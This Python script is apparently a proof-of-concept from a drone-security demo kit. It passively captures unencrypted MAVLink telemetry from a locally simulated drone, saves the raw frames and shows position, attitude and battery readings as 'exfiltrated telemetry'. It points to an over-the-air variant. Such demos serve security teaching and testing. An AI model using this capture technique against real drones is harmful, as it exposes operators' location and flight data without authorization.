#!/usr/bin/env python3
"""PoC 02 - Telemetry eavesdropping (Terminal 2 — attacker).

Requires the drone running in Terminal 1 (`python attacks/demos/drone.py`).
Passively captures the cleartext downlink, shows it live and SAVES the raw frames
to a .bin. Step 2: decode it offline into readable text with `decode.py`.
Over-the-air version: attacks/02-eavesdrop/eavesdrop_aire.py
"""
import argparse
import math
import os
os.environ.setdefault("MAVLINK20", "1")
from pwnuav.tui import ClientLink, Activity, hw_check, Steps, run_dashboard

CAP = os.path.join(os.path.dirname(os.path.abspath(__file__)), "capture.bin")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--connect", default="udpout:127.0.0.1:14550")
    ap.add_argument("--file", default=CAP, help=".bin file to save the capture to")
    ap.add_argument("--plain", action="store_true")
    ap.add_argument("--seconds", type=float, default=None)
    a = ap.parse_args()

    link = ClientLink(a.connect, capture_path=a.file)
    act = Activity(); hw = hw_check()
    act.log("hardware checked — passive capture, no keys")
    act.log(f"saving raw frames -> {os.path.basename(a.file)}")

    def s1(): act.log("[IA-01] passive downlink capture (0 keys, 0 handshakes)")
    def s2(): act.log("[PA-01] demodulating cleartext MAVLink...")
    def s3(): act.log("[IM-04] reconstructing the flight picture")
    def s4():
        act.log(f"[+] {link.total} frames read without a key; {link.saved} saved to the .bin")
    def s5():
        act.log("[>] step 2 — decode: python attacks/demos/02-eavesdrop/decode.py")

    steps = Steps([(0.6, s1), (1.6, s2), (2.6, s3), (3.6, s4), (4.4, s5)])

    def extra():
        g = link.last.get("GLOBAL_POSITION_INT"); ss = link.last.get("SYS_STATUS")
        at = link.last.get("ATTITUDE")
        rows = []
        if g: rows.append(f"pos   lat {g.lat/1e7:.5f}  lon {g.lon/1e7:.5f}  alt {g.alt/1000:.0f} m")
        if at: rows.append(f"att   roll {math.degrees(at.roll):.0f}  yaw {math.degrees(at.yaw):.0f} deg")
        if ss: rows.append(f"batt  {ss.voltage_battery/1000:.1f} V  {ss.battery_remaining}%")
        rows.append(f"capture -> {os.path.basename(a.file)}  ({link.saved} frames saved)")
        return ("EXFILTRATED TELEMETRY (unencrypted payload)", rows or ["capturing..."])

    run_dashboard("PoC 02 — Eavesdropping", hw, link, act, steps,
                  total=a.seconds, plain=a.plain, extra_fn=extra)
    saved, path = link.saved, a.file
    link.close()
    print(f"\n[capture saved] {path}  ({saved} frames)")
    print(f"[decode]        python attacks/demos/02-eavesdrop/decode.py --file {path}")


if __name__ == "__main__":
    main()
